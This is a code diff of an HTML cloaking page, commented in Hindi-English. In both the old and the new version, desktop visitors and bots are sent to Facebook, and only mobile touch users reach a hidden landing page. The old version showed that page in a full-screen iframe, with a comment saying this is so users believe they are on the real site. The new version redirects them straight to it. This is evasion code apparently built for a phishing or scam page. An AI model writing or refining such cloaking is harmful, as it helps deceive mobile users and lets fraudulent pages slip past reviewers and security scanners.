@@ -1,31 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Welcome</title>
+    <title>Loading...</title>
     <script>
         (function() {
-            // FAST DETECTION: User-agent aur Touch check
+            // Mobile aur Touch detection
             var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
             var isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
-            if (!isMobile || !isTouch) {
-                // LAPTOP/BOTS: Inhe foran Facebook par redirect karo
+            if (isMobile && isTouch) {
+                // MOBILE USER: Seedha landing page par bhej do
+                window.location.replace("https://rose-pigeon-t9wsnt.mystrikingly.com");
+            } else {
+                // LAPTOP/BOTS: Foran Facebook par bhej do
                 window.location.replace("https://www.facebook.com");
             }
-            // Mobile users ke liye koi 'else' ya 'delay' nahi, neeche ka iframe khud hi load ho jayega
         })();
     </script>
-    <style>
-        /* FULL SCREEN IFRAME: Taaki user ko lage wo asli site par hai */
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; }
-        iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
-    </style>
 </head>
-<body>
-
-    <iframe src="https://rose-pigeon-t9wsnt.mystrikingly.com"></iframe>
-
+<body style="background: white;">
 </body>
 </html>
